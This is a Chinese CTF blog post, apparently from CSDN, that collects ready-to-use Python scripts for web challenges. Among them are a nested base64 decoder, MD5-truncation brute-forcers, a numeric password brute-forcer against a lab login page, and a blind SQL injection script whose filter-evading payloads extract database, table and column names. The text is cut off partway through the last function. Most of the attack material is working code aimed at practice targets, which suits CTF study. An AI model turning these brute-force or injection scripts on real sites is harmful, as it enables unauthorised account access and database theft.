<!--yml
category: 未分类
date: 2022-04-26 14:48:03
-->

# CTF-web 第十一部分 实用脚本_iamsongyu的博客-CSDN博客

> 来源：[https://blog.csdn.net/iamsongyu/article/details/84105013](https://blog.csdn.net/iamsongyu/article/details/84105013)

在我们进行有关的WEB题目解答时，脚本的的编写是一个必不可少的必备的技能。一般需要我们使用脚本的情况只有两种：

（1）要求速度的时候，往往我们手动的提交或者计算并不能满足题目的要求速度。

（2）大量重复性的工作，比如进行密码或者等其他的爆破。

        这里我们所记录下来的脚本，都是比较好懂的，常用的，在遇到有关的问题的时候，可以进行适当的修改。虽然前文在相关的部分已经附上了代码，但是在这里总结一些吧，废话不多数，直接上代码。

但是啊，我们自己还是需要多加练习的，当初比赛的时候，同组就有一个大佬，真的是手撸脚本，跟他说需要啥功能，就看他在那里自己造轮子，但是功底确实扎实，一会就弄出来了，相比之下我就不是很熟练..用什么有时候还需要百度查一下。这里的脚本大部分都是做题的时候遇到的，或者更改的，有小部分是自己写的，但是大部分都不是我弄得,提前说明一下哈。

**循环多次解密**

在题目中可能会有使用一个加密方法多次加密的情况，这时候我们就可以使用这个脚本，其中的解密方法，数据等自己根据情况更改

```
import base64

def loopgetkey(data1):
        while 1:
            try:
                data1 = base64.decodebytes(data1)
            except:
                print(data1)
                break

data="Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTVjAxV2JETlhhMUpUVmpBeFYySkVUbGhoTVVwVVZtcEJlRll5U2tWVWJHaG9UVlZ3VlZacVFtRlRNbEpJVm10a1dHSkdjRTlaVjNSR1pVWmFkR05GU214U2JHdzFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm1wT1QwMHhjRlpYYlhSWFRWaENSbFpYZUZOVWJVWTJVbFJDVjAxdVVuWlZha1pYWkVaT2NscEdhR2xTTW1ob1YxWlNTMkl4U2tkWGJHUllZbFZhY1ZadGRHRk5SbFowWlVaT1ZXSlZXVEpWYkZKSFZqRmFSbUl6WkZkaGExcG9WakJhVDJOdFJraGhSazVzWWxob1dGWnRNWGRVTVZGM1RVaG9hbEpzY0ZsWmJGWmhZMnhXY1ZGVVJsTk5XRUpIVmpKNFQxWlhTa2RqUm14aFUwaENTRlpxUm1GU2JVbDZXa1prYUdFeGNHOVdha0poVkRKT2RGSnJhR2hTYXpWeldXeG9iMWRHV25STldHUlZUVlpHTTFSVmFHOWhiRXB6WTBac1dtSkdXbWhaTVZwaFpFZFNTRkpyTlZOaVJtOTNWMnhXYjJFeFdYZE5WVlpUWVRGd1YxbHJXa3RUUmxweFVtMUdVMkpWYkRaWGExcHJZVWRGZUdOSE9WZGhhMHBvVmtSS1QyUkdTbkpoUjJoVFlYcFdlbGRYZUc5aU1XUkhWMjVTVGxOSFVuTlZha0p6VGtaVmVXUkhkRmhTTUhCSlZsZDRjMWR0U2tkWGJXaGFUVzVvV0ZsNlJsZGpiSEJIV2tkc1UySnJTbUZXTW5oWFdWWlJlRmRzYUZSaVJuQlpWbXRXZDFZeGJISlhhM1JVVW14d2VGVXlkR0ZpUmxwelYyeHdXR0V4Y0hKWlZXUkdaVWRPUjJKR2FHaE5WbkJ2Vm10U1MxUnRWa2RqUld4VllsZG9WRlJYTlc5V1ZscEhXVE5vYVUxWFVucFdNV2h2VjBkS1dWVnJPVlpoYTFwSVZHeGFZVmRGTlZaUFYyaHBVbGhCZDFac1pEUmpNV1IwVTJ0b2FGSnNTbGhVVlZwM1ZrWmFjVk5yWkZOaVJrcDZWa2N4YzFVeVNuSlRiVVpYVFc1b1dGZFdXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZaZUdKSVNsaGhNMUpVVlcxNGQyVkdWbGRoUnpsb1RWWndlbFl5Y0VkV01ERjFZVWhLV2xaWFVrZGFWM2hIWTIxS1IyRkdhRlJTVlhCS1ZtMTBVMU14VlhoWFdHaFlZbXhhVjFsc1pHOVdSbXhaWTBaa2JHSkhVbGxhVldNMVlWVXhXRlZyYUZkTmFsWlVWa2Q0YTFOR1ZuTlhiRlpYWWtoQ1NWWkdVa2RWTVZwMFVtdG9VRll5YUhCVmJHaERUbXhrVlZGdFJtcE5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrNXlXa1pPYVZKcmNEWldhMk40WXpGVmVWTnVTbFJpVlZwWVZGYzFiMWRHWkZkWGJFcHNVbTFTZWxsVldsTmhWa3AxVVd4d1YySllVbGhhUkVaYVpVZEtTVk5zYUdoTk1VcFZWbGN4TkdReVZrZFdXR3hyVWpOU2IxbHNWbmRXTVZwMFkwZEdXR0pHY0ZoWk1HUnZWMnhhV0ZWclpHRldWMUpRVlRCVk5WWXhjRWhoUjJoT1UwVktNbFp0TVRCVk1VMTRWVmhzVm1FeVVsWlpiWFIzWVVaV2RHVkZkR3BTYkhCNFZrY3dOVll4V25OalJXaFlWa1UxZGxsV1ZYaFhSbFoxWTBaa1RsWXlhREpXTVZwaFV6RkplRlJ1VmxKaVJscFlWRlJHUzA1c1drZFZhMlJXVFZad01GVnRkRzlWUmxwMFlVWlNWVlpYYUVSVk1uaGhZekZ3UlZWdGNFNVdNVWwzVmxSS01HRXhaRWhUYkdob1VqQmFWbFp1Y0Zka2JGbDNWMjVLYkZKdFVubGFSV1IzWVZaYWNtTkZiRmRpUjFFd1ZrUktSMVl4VGxsalJuQk9UVzFvV1ZkV1VrZGtNa1pIVjJ4V1UySkdjSE5WYlRGVFRWWlZlV042UmxoU2EzQmFWVmMxYjFZeFdYcGhTRXBWWVRKU1NGVnFSbUZYVm5CSVlVWk9WMVpHV2xaV2JHTjRUa2RSZVZaclpGZGlSMUp2Vlc1d2MySXhVbGRYYm1Sc1lrWnNOVmt3Vm10V01ERkZVbXBHV2xaWGFFeFdNbmhoVjBaV2NscEhSbGROTW1oSlYxUkplRk14U1hoalJXUmhVbFJXVDFWc2FFTlRNVnAwVFZSQ1ZrMVZNVFJXYkdodlYwWmtTR0ZHYkZwaVdHaG9WbTE0YzJOc2NFaFBWM0JUWWtoQ05GWnJZM2RPVmxsNFYyNVNWbUpIYUZoV2FrNU9UVlphV0dNemFGaFNiRnA1V1ZWYWExUnRSbk5YYkZaWFlUSlJNRmRXV2t0ak1WSjFWRzFvVTJKR2NGbFhWM2hoVW0xUmVGZHVSbEppVlZwaFZtMHhVMU5XV2xoa1J6bG9UVlZ3TUZsVldsTldWbHBZWVVWU1ZrMXVhR2haZWtaM1VsWldkR05GTlZkTlZXd3pWbXhTUzAxSFNYbFNhMlJVWW1zMVZWbHJaRzlXYkZwMFpVaGtUazFXYkROV01qVkxZa1pLZEZWdWJHRlNWMUl6V1ZaYVlXTnRUa1ppUm1ScFVqRkZkMWRXVWt0U01WbDRWRzVXVm1KRlNsaFZiRkpYVjFaYVIxbDZSbWxOVjFKSVdXdG9SMVpIUlhoalNFNVdZbFJHVkZZeWVHdGpiRnBWVW14a1RsWnVRalpYVkVKaFZqRmtSMWRZY0ZaaWEzQllWbXRXWVdWc1duRlNiR1JxVFZkU2VsbFZaSE5XTVZwMVVXeEdWMkV4Y0doWFZtUlNaVlphY2xwR1pGaFNNMmg1VmxkMFYxTXhaRWRWYkdSWVltMVNjMVp0TVRCTk1WbDVUbGQwV0ZKcmJETldiWEJUVjJzeFIxTnNRbGROYWtaSFdsWmFWMk5zY0VoU2JHUk9UVzFvU2xZeFVrcGxSazE0VTFob2FsSlhhSEJWYlRGdlZrWmFjMkZGVGxSTlZuQXdWRlpTUTFack1WWk5WRkpYWWtkb2RsWXdXbXRUUjBaSFlrWndhVmRIYUc5V2JYQkhZekpOZUdORmFGQldiVkpVV1d4b2IxbFdaRlZSYlVab1RXdHdTVlV5ZEc5V2JVcElaVWRvVjJKSFVrOVVWbHB6VmpGYVdXRkdhRk5pUm5BMVYxWldZV0V4VW5SU2JrNVlZa1phV0ZsVVNsSk5SbFkyVW10MGFrMVlRa3BXYlhoVFlWWktjMk5HYkZoV00xSm9Xa1JCTVdNeFpISmhSM2hUVFVad2FGWnRNSGhWTVVsNFZXNU9XR0pWV2xkVmJYaHpUbFpzVm1GRlRsZGlWWEJKV1ZWV1QxbFdTa1pYYldoYVpXdGFNMVZzV2xka1IwNUdUbFprVGxaWGQzcFdiWGhUVXpBeFNGTlliRk5oTWxKVldXMXpNVlpXYkhKYVJ6bFhZa1p3ZWxZeU5XdFVhekZYWTBoc1YwMXFSa2haVjNoaFkyMU9SVkZ0UmxOV01VWXpWbTF3UzFNeVRuTlVia3BxVW0xb2NGVnRlSGRsVm1SWlkwVmtWMkpXV2xoV1J6VlBZVlpLZFZGck9WVldla1oyVmpGYWExWXhWbkphUjNST1lURndTVlpxU2pSV01WVjVVMnRrYWxORk5WZFpiRkpIVmtaU1YxZHNXbXhXTURReVZXMTRhMVJzV25WUmFscFlWa1ZLYUZacVJtdFNNV1IxVkd4U2FFMXRhRzlXVjNSWFdWZE9jMVp1UmxSaE0xSlZWbTE0UzAxR2JGWlhhemxYVFZad1NGWXljRXRXTWtwSVZHcFNWV0V5VWxOYVZscGhZMnh3UjFwR2FGTk5NbWcxVm14a2QxUXhWWGxUV0docFUwVTFXRmx0TVZOWFJsSlhWMjVrVGxKdGRETlhhMVpyVjBaSmQyTkZhRnBOUm5CMlZqSnplRk5HVm5WWGJHUk9ZbTFvYjFacVFtRldNazV6WTBWb1UySkhVbGhVVmxaM1ZXeGFjMVZyVG1oTlZXdzBWVEZvYzFVeVJYbGhTRUpXWWxoTmVGa3dXbk5XVmtaMVdrVTFhVkp1UVhkV1JscFRVVEZhY2sxV1drNVdSa3BZVm01d1YxWkdXbkZUYTFwc1ZteGFNVlZ0ZUdGaFZrbDRVbGhrVjJKVVJUQlpla3BPWlVkT1JtRkdRbGRpVmtwVlYxZDBWMlF4WkhOWGEyaHNVak5DVUZadGVITk9SbGw1VGxaT1YySlZjRWxaVlZwdlZqSkdjazVWT1ZWV2JIQm9WakJrVG1WdFJrZGhSazVwVW01Qk1sWXhXbGRaVjBWNFZXNU9XRmRIZUc5VmExWjNWMFpTVjFkdVpHaFNiRmt5VlcxME1HRnJNVmRUYWtaWFZqTm9VRmxXV2twbFJrNTFXa1prYUdFd2NGaFdSbFpXWlVaSmVGcElTbWhTTTFKVVZGVmFkMlJzV2tkYVNIQk9WakZhZWxZeGFITlVNVnB5VGxjNVZWWnNXak5VVlZwaFYwVTFWbFJzWkU1aE0wSktWMVpXVjFVeFdsaFRiR3hvVWpKb1dGbHJXbmRWUmxwelYydDBhazFXY0hsVWJGcHJZVmRGZDFkWWNGZGlXR2h4V2tSQmVGWXhVbGxoUm1ob1RXMW9WbGRYZEd0aU1rbDRWbTVHVW1KVldsaFphMXAzVFVad1ZtRkhkRlZoZWtaYVZWZDRjMWxXV2xoaFJYaGFZVEZ3WVZwVldtdGpiVTVIWVVkb1RsZEZTbEpXYlRGM1V6RktkRlpyYUZWaE1WcFlXV3RrVTFaR1ZuTlhibVJzVm0xU1dsa3dWbXRXTWtwWFVtcE9WVlpzV25wWlZscEtaVmRHUjFWc2NHbFNNbWd5Vm1wR1lXRXhaRWhXYTJoUVZtdHdUMVpzVWtaTlJtUlZVVzFHV2xac2JEUlhhMVp2WVVaS2MxTnNXbGRpVkVaVVZtdGFkMWRIVmtsVWJHUnBVakZLTmxaclkzaGlNVmw1VWxod1VsZEhhRmhXYlRGU1RVWndSVkpzY0d4V2F6VjZXV3RhWVdGV1NYbGhSemxYVmpOU1dGZFdaRTlqTVZwMVVteFNhRTB4U2xaV2JURjZUVlV4UjFadVVteFNWR3h3VldwQ2QxZHNiRlpWYkU1WFRVUkdXVlpXYUd0WFJscDBWV3hPWVZac2NHaFpNbmgzVWpGd1IyRkdUazVOYldjeFZtMTRhMlF4UlhoaVJtaFZZVEpTV0ZsdGVFdGpNVlYzV2taT2FrMVhlSGxXTWpWUFZERmFkVkZzWkZwV1YxRjNWakJhUzJOdFNrVlViR1JwVjBWS1ZWWnFTbnBsUmtsNFZHNU9VbUpIVWs5WlYzUmhVMFprYzFkdFJsZE5helY2V1RCV2IxVXlTa2hWYXpsVlZucEdkbFV5ZUZwbFJsWnlZMGQ0VTJGNlJUQldWRVp2WWpKR2MxTnNhRlppVjJoWFdXdGFTMWRHV2tWU2JHUnFUV3RhUjFaSGVGTlViRnAxVVZoa1YxSnNjRlJWVkVaaFkyc3hWMWRyTlZkU2EzQlpWMWQwYTJJeVVuTlhXR1JZWWxoU1ZWVnFRbUZUVm14V1YyMUdWV0pGY0RGVlZ6QTFWakpLVlZKVVFscGxhM0JRV1hwR2QxTldUblJrUms1T1RVVndWbFl4WkRCaU1VVjNUbFZrV0dKcmNHRlVWRXBUVlVaYWRHVklUazlTYkd3MVZHeFZOV0ZIU2taalJteGFWbFp3ZWxacVNrWmxSbHBaWVVkR1UwMHlhRFpXYlhCSFdWWmtXRkpyWkdoU2F6VndWVzAxUWsxc1dYaFhiR1JhVmpCV05GWlhOVTlYUm1SSVpVYzVWbUV4V2pOV01GcFRWakZrZFZwSGFGTmlSbXQ1VmxjeE1FMUhSbkpOVm1SVVlXdGFXRlpxVG05U1JscHhVMnQwVTAxck5VaFphMXB2VmpBd2VGTnFTbGRXYkVwSVZsUkdXbVZIVGtaaVJsWnBVakpvZDFadGVHRmtNV1JIVjJ0a1dHSlZXbkZVVlZKWFUwWlplR0ZJVGxWTlZuQjVWR3hqTlZaV1duTlhibkJWWWtad2VsWnRNVWRTYkZKeldrZHNWMWRGU2t0V01WcFhWakZWZUZkWVpFNVdiVkp4VldwS2IxbFdVbGRYYm1SV1VtMTBORll5ZUd0aGF6RllWVzVzVldKR2NISldSM2hoVjBkUmVtTkdaR2xYUjJoVlZsaHdRbVZHVGtkVWJHeHBVbXMxYjFSWGVFdFdiR1JZVFZod1RsWnNjRmhaYTJoTFdWWktObUpHYUZwaE1YQXpXbGQ0V21WVk5WaGtSbFpvWld0YVdsZHNWbUZoTVZsM1RWaEdWMkpyY0ZoV2ExWjNWRVpWZUZkclpHcGlWVnBJVjJ0YVQxUnJNWFJoUmxwWFlsUkdNMVY2Ums1bFZsSjFWR3hXYVdFelFuWldWekI0VlRGYVIxVnNWbFJpVkd4d1ZGWmFkMlZXV2xoa1JFSldUVVJHV1ZaWGRHOVdhekYxWVVod1dGWnNjRXRhVjNoSFl6RldjMXBIYUdobGJGbDVWbTF3UjFsWFJYaGFSV2hYWVRKb1VWWnRkSGRVTVZwMFpFaGtWRlp0VWxaVlZ6RkhZVlV4Y2xkcVFsZGlWRlpNVmpCa1MxTkhWa2RhUm5CcFVqSm9WVlpHVWtka01WbDRXa2hTYTFJelFuQlZha1pLWkRGYVJWSnRkR2xOVm13elZGWldhMkZGTUhsbFJtaGFZa1pLUTFwVlduTmpWa3B6WTBkNFUySldTalZXYWtvMFZUSkdXRk5yYkZKaVIyaFlXV3hvVTFkR1pGZGFSbVJxVFZkU01WVnRlRTloVmtsNFUyNW9WMUpzY0hKV1ZFcFhZekpLUjFkdFJsUlNWRloyVm0weE5HUXlWbGRoTTJSV1lsVmFXRlJWVWtkWFZscFhZVWQwV0ZKc2NEQldWM2hQV1ZaYWMyTkhhRnBOYm1nelZXcEdkMUl5UmtkVWF6Vk9ZbGRqZUZadE1UUmhNREZIVjFob1ZWZEhhR2hWYkdSVFZqRnNjbHBHVGxoV2JYZ3dWRlphVDJGck1WZGpSRUpoVmxkb1VGWkVSbUZrVmtaeldrWndWMVl4UmpOV2FrSmhVMjFSZVZScldtaFNia0pQVlcwMVEwMXNXbkZUYm5Cc1VtczFTVlZ0ZEdGaVJrcDBWV3M1V21KVVJuWlpha1poWTFaR2RGSnNaRTVoZWxZMlYxUkNWMkl4VlhsVGEyaFdZa2RvVmxadGVHRk5NVnBZWlVkR2FrMVdXbmxXUjNocllVZFdjMWRzYkZkaGExcDJXV3BLUjJNeFRuTmhSMmhUWlcxNFdGZFdaREJrTWxKelYydFdVMkpHY0hKVVZscDNaVlp3UmxaVVJtaFdhM0F4VlZab2ExZEhTa2RYYmtaVllrZFNSMXBFUVhoV01XUnlUbFprVTJFelFscFdiVEIzWlVkSmVWVnVUbGhYUjFKWldXeG9VMVpXVm5GUmJVWlVZa1phTUZwVlpFZGhSbHB5WWtSU1ZtSkhhSEpXYWtwTFZsWktWVkZzY0d4aE0wSlFWMnhXWVdFeVVsZFdiazVWWWxkNFZGUldWbmRXYkZsNFdrUkNWMDFzUmpSWGEyaFBWMGRGZVdGSVRsWmhhelZFVmxWYVlXUkZNVmRVYkZKVFlrZDNNVlpIZUZaT1YwWklVMnRhYWxKRlNtaFdiR1JUVTBaYWMxZHRSbGROYXpWSVYydGFWMVl5U2tsUmFscFhZbGhDU0ZkV1dtdFhSa3B5WVVkd1UwMXVhRmxXYWtKWFV6Rk9SMWR1VW14U00xSlFWV3BDVjA1R1dsaE9WazVXVFd0d2VWUnNXbk5YYlVWNFkwZG9WMDFXY0doYVJWVjRWakZPY2s1V1RtbFNiWFExVm14amQyVkdTWGxTYmxKVFlXeHdXRmxyWkc5WlZteFZVbTVrVlZKdGVGaFdNblF3WVdzeGNrNVZhRnBoTVhCMlZtcEJkMlZHVG5SUFZtaG9UVlZ3U1ZkV1VrZFhiVlpIWTBWc1ZHSlhhRlJVVkVaTFZsWmFSMVp0Um10TlYxSllWakowYTFsV1RrbFJiazVXWWtaS1dGWXdXbUZrUlRWWFZHMW9UbFpYT0hsWFYzUmhZVEZhZEZOc2JHaFRTRUpXV1d0YWQyVnNXblJOVldSVFlrWktlbGRyWkhOV01XUkdVMnQwVjAxV2NGaFdha1pXWlVaa1dWcEZOVmRpVmtwNFZsZHdTMkl4YkZkVmJHUllZbTFTVjFWdE1UQk9SbGw1WlVkMGFHRjZSbGxXVnpWelZsZEtSMk5JU2xkU00yaG9WakJrVW1WdFRrZGFSMnhZVWpKb1ZsWnNhSGRSYlZaSFZHdGtWR0pIZUc5VmFrSmhWa1phY1ZOdE9WZGlSMUpaV2tWa01HRlZNWEppUkZKWFlsUldWRlpIZUdGT2JVcElVbXhrYVZkSFozcFhiRnBoV1ZkU1JrMVdXbUZTYkZwdldsZDBZVmRzWkhOV2JVWm9UVlpzTTFSV2FFZFdNa3B5WTBab1YyRXhXak5XUlZwV1pVWmtjbHBIY0dsV1ZuQkpWakowWVZReFVuSk5XRkpvVW14d1dGbHNVa2ROTVZZMlVtczFiRlpzU2pGV1IzaFhZVmRGZWxGdWFGZFdla0kwV1dwS1QxSXhXblZWYlhoVVVqRktkMVpHV210Vk1XUkhWMnhvYTFKRlNsZFVWVkpIVjBac2NsVnNUbGROVld3MldWVm9kMWRzV1hwaFJYaGhVbXh3U0ZreWN6VldNVnB6V2tkNGFFMVhPVFZXYlRGM1VqRnNWMkpHWkZSWFIyaHdWV3RhZDFaR2JITmFSRkpWVFZad2VGVnRkREJXUmxwelkwaG9WazFXU2toV1ZFRjRWakZhY1Zac1drNWliRXB2VjFaa05GUXhTbkpPVm1SaFVtNUNjRlZ0ZEhkVFZscDBaRWRHV0dKV1dsbFdiWFJ2WVRGSmVsRnVRbFppVkZaRVZtcEdZVmRGTVZWVmJXeE9WbXhaTVZaWGVHOWtNVlowVTJ4YVdHSkhhRmhaYkZKSFZURlNWbGR1VGs5aVJYQXdXa1ZhVDFSc1dYaFRXR2hYWWtkUk1GZFdaRWRUUms1eVlrWkthVkl4U2xsWFYzaFRVbXN4UjJORlZsUmlSMUp4VkZaa1UwMVdWblJsUlRsb1ZtdHNORlV5Tlc5V01VcHpZMGhLVjFaRmNGaFpla3BMVWpGa2RGSnNVbE5XUmxveVZtMHdlRTVIVVhsV2JHUm9UVEpTV1ZsdE1WTlhSbEpZWkVoa1ZGWnNjRWxaTUZwUFZqRlpkMVpxVmxkV00yaFFWMVphWVdNeVRraGhSbkJPWW0xbmVsWlhjRWRrTVU1SVUydG9hVkpyTlZsVmJGWjNWVEZhZEUxSVpHeFNWRlpKVld4b2IxWXhaRWhoUjJoV1lrZFNWRlpxUm5OamJHUjFXa1prVGxZemFGZFdWRW8wVkRKR2NrMVdaR3BTUlVwb1ZteGFXbVF4YkhKYVJYUlRUV3MxUmxWWGVGZFdNVnB5WTBac1YySllRa05hVlZwTFZqRk9kVlJ0UmxOaWEwcDNWMWN4TUZNeFVsZFhibEpPVTBkb1ZWUldaRk5YUmxwMFRsWmtXRkl3Y0VsV1Z6QTFWMnhhUmxkcVRscGhhMXBvVmpCVmVGWldWblJoUlRWb1pXeFdNMVp0TUhoTlIwVjRZa1prVkZkSGVHOVZibkJ6Vm14YWNsWnJkRlZTYkhCWldsVmtSMkZyTVZoa1JGcGFWbFpWTVZaVVNrdFhWMFpIWTBaa2FFMVlRakpYVjNCTFVqSk5lRlJ1VG1oU01taFZWV3hXZDFkR1pGaGxSemxWWWxaYVNGWXlkRmRWTWtwV1YyNUdWVlp0VWxSYVYzaHlaREZ3UlZWdGFGZGhNMEY0VmxaYWIyRXhaRWhUYTJSWVltdHdWMWxYZEdGaFJtdDVZek5vVjAxWFVqQlphMXBQVlRKRmVsRnRPVmROVm5CVVZXcEtVbVZXVW5WVWJHaFlVakZLYjFaWGVHOVZNazVYWWtoT1YxWkZXbFJVVmxwSFRrWlplVTFVUW1oU2JIQXdWbGQwYzFkSFJuSk9WRTVYWVd0d1NGa3llRTlrUjBaSFkwZDRhRTFZUWpWV2JYQkRXVlpWZVZSdVRtcFNWMmhVV1d0Vk1XTkdXblJrU0dSWFlrWnNORmRyVWtOWGJGbDRVbXBPVldKR2NISldNR1JMWXpGT2NrOVdaR2hOVm5CTlZqRmFZVmxYVWtoV2ExcGhVbFJzVkZscmFFSmtNV1J6Vm0xR2FFMVdjRmxWTW5SaFlXeEtXR1ZIUmxWV1JUVkVXbFphVjFJeFNsVmlSa1pXVmtSQk5RPT0="
loopgetkey(bytes(data, encoding='utf-8')) 
```

**快速获取响应信息并提交**

```
import base64
import requests

# 本题目提醒 快速 提交给ichunqiu你发现的 需要session保持会话
# 测试相应中有ZmxhZ19pc19oZXJlOiBOalkwTXpZMA== 尝试base64解码 得到flag_is_here: NjY0MzY0= （每次不一样） 还需要解码
# 再次post提交 {"ichunqiu": 解码数据}

url = "http://607d622601d049a3a3e7ef03f58670e445529dac09dd4a96.game.ichunqiu.com/"
a = requests.session()
b = a.get(url)
data = b.headers["flag"]
datadecode = base64.b64decode(data)

# flag_is_here: NjY0MzY0 需要使用：进行分组
splitstr = str(datadecode).split(':')
key = splitstr[1].replace('\'', '')

# 对后面的再次解码
key1 = base64.b64decode(key)
body = {"ichunqiu": key1}
print(body)
f = a.post(url, data=body)
print(f.text)

# 原版好用 但是过滤不强
# import base64,requests
#
# a = requests.session()
# b = a.get("http://8564a824863f418484029f2013a3dcf3412fa4677a31498d.game.ichunqiu.com/")
# key1 = b.headers["flag"]
# c = base64.b64decode(key1)
# d = str(c).split(':')
# key = base64.b64decode(d[1])
# body = {"ichunqiu":key}
# f = a.post("http://8564a824863f418484029f2013a3dcf3412fa4677a31498d.game.ichunqiu.com/", data=body)
# print(f.text)
```

**MD5截断值爆破**

 MD5截断数值已知 求原始数据，这种题是十分常见的

```
import hashlib
from multiprocessing.dummy import Pool as ThreadPool

# MD5截断数值已知 求原始数据
# 例子 substr(md5(captcha), 0, 6)=60b7ef

def md5(s):  # 计算MD5字符串
    return hashlib.md5(str(s).encode('utf-8')).hexdigest()

keymd5 = '8e6d35'   #已知的md5截断值
md5start = 0   # 设置题目已知的截断位置
md5length = 6

def findmd5(sss):    # 输入范围 里面会进行md5测试
    key = sss.split(':')
    start = int(key[0])   # 开始位置
    end = int(key[1])    # 结束位置
    result = 0
    for i in range(start, end):
        # print(md5(i)[md5start:md5length])
        if md5(i)[0:6] == keymd5:            # 拿到加密字符串
            result = i
            print(result)    # 打印
            break

list=[]
for i in range(10):   # 多线程的数字列表 开始与结尾
    list.append(str(10000000*i) + ':' + str(10000000*(i+1)))
pool = ThreadPool()    # 多线程任务
pool.map(findmd5, list)
pool.close()
pool.join() 
```

**MD5截断值爆破2**

这个脚本不同于上一个的地方是，对原本的数值是有要求的，比如变量拥有一部分固定值，猜测是字符是在一定范围内的

```
import hashlib
import random
import requests
# MD5截断数值已知
# 变量值有一定要求
# 求原始数据

# 本题 限制120s 爆破10次以上 变量固定前两个字符，MD5截断为固定值

def md5(s):
    return hashlib.md5(str(s).encode('utf-8')).hexdigest()

# substr(md5($value),5,4)==0)
def findbest(s):
    for i in range(1000000):
        str = s + random.choice(guess)
        str = str + random.choice(guess)
        str = str + random.choice(guess)
        str = str + random.choice(guess)
        str = str + random.choice(guess)
        str = str + random.choice(guess)
        if (md5(str))[5:9] == "0000":
            print(str)
            return str

# 访问并截取新的关键字
def url_open(keystr, url, session):
    payload= "value="+keystr
    respon = a.get(url + payload).text
    print(respon[0:2])
    return respon[0:2], len(respon), respon

# 初始连接 字符集
urllink = "http://aa153e3db8114f409fa459050284db8920827b2ffaa34944.game.ichunqiu.com/?"
# guess = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]
guess = "abcdefghijklmnopqrstuvwxyz"
a = requests.session()

# 初始key关键字
keyfirst = 'ea'
# 普通返回长度
normallen = 0

for i in range(1, 100):
    # 寻找满足条件的字符串
    keystr = findbest(keyfirst)

    # 请求获取新的key关键字 记录普通长度 比对flag长度
    keyfirst,length, res = url_open(keystr, urllink, a)
    if i == 1:
        normallen =length
    else:
        if normallen < length:
            print(res)
            break
```

**一次验证，爆破密码**

在有关验证码的题目中，我们有的题目只需要一次验证即可以一直使用，在这种情况下，需要我们爆破拥有一定格式的密码（可以自行设定裁剪的范围）

```
import  requests
# 针对一次性验证码 爆破数字密码用

url = 'http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/login.php'
header = {
            "Host": "lab1.xseclab.com",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            "Referer": "http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/index.php",
            "Cookie": "PHPSESSID=7667f63d7c38a42374e3afaa9a203d86",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "48"
         }

# 设置参数变化范围
start = 1000
final = 9999
step = 1
startlength = 0  # 记录初始返回相应的长度 如果响应长度发生变化 那就是找到了
for i in range(start, final, step):
    payload = {'username': 'admin', 'pwd': i, 'vcode': 'JQ28', 'submit': 'submit'}
    contents = requests.post(url=url, headers=header, data=payload).content.decode('utf-8')
    if i == start:
        startlength = len(contents)
    else:
        if len(contents) > startlength:
            print("%d : %s" % (i, contents))
            break
```

**sql 暴力猜解**

```
import requests
# 本脚本用于自动爆破数据库长度 名字 表的长度名字 字段数值等
# 使用中，6个函数需要自己手动运行，根据返回的参数带入到下一个函数进行
# 具体的每个函数的利用代码 需要根据情况更改

url = "http://ctf5.shiyanbar.com/web/earnest/index.php"  # 测试的路径
str = "You are in"   # 成功时可以在响应中匹配到的字符串，用于判断
guess = "abcdefghijklmnopqrstuvwxyz0123456789~+=-*/\{}?!:@#$&[]."  # 名字猜解的字符范围

def get_ku_length():
    print('start')
    for i in range(1, 30):
        key = {'id': "0'oorr(length(database())=%s)oorr'0" % i}
        res = requests.post(url, data=key).text
        print(i)
        if str in res:
            print("find the length %s" %i)
            break

def get_ku_name():
    database = ''
    print('start')
    for i in range(1, 19):
        for j in guess:
            key = {'id': "0'oorr((mid((database())from(%s)foorr(1)))='%s')oorr'0" % (i, j)}
            res = requests.post(url, data=key).text
            print('............%s......%s.......' % (i, j))
            if str in res:
                database += j
                break
    print(database)

def get_table_length():
    i = 1
    print("start")
    while True:
        # 多个表名使用@隔开
        res = "0'oorr((select(mid(group_concat(table_name separatoorr '@')from(%s)foorr(1)))from(infoorrmation_schema.tables)where(table_schema)=database())='')oorr'0" % i
        res = res.replace(' ', chr(0x0a))
        key = {'id': res}
        r = requests.post(url, data=key).text
        print(i)
        if str in r:
            print("length: %s" % i)
            break
        i += 1
    print("end!")

def get_table_name():
    table = ""
    print("start")
    for i in range(1, 12):
        for j in guess:
            res = "0'oorr((select(mid(group_concat(table_name separatoorr '@')from(%s)foorr(1)))from(infoorrmation_schema.tab" \
                  "les)where(table_schema)=database())='%s')oorr'0" % (i, j)
            # 由于屏蔽空格 替换为换行符号
            res = res.replace(' ', chr(0x0a))
            key = {'id': res}
            r = requests.post(url, data=key).text
            print('---------%s---------%s' % (i, j))
            if str in r:
                table += j
                break
    print(table)
    print("end!")

def get_ziduan_length(table_name):
    i = 1
    print("start")
    while True:
        # res = "0'oorr((select(mid(group_concat(column_name separatoorr '@')from(%s)foorr(1)))from(infoorrmation_schema.columns)where(table_name)='fiag')='')oorr'0" % i
        res = "0'oorr((select(mid(group_concat(column_name separatoorr '@')from(%s)foorr(1)))from(infoorrmation_schema.columns)where(table_name)="% i
        res += "'"+table_name + "')='')oorr'0"
        print(res)
        res = res.replace(' ', chr(0x0a))
        key = {'id': res}
        r = requests.post(url, data=key).text
        print(i)
        if str in r:
            print("length: %s" % i)
            break
        i += 1
    print("end!")

def get_ziduan_name():
    column = ""
    print("start")
    for i in range(1, 6):
        for j in guess:
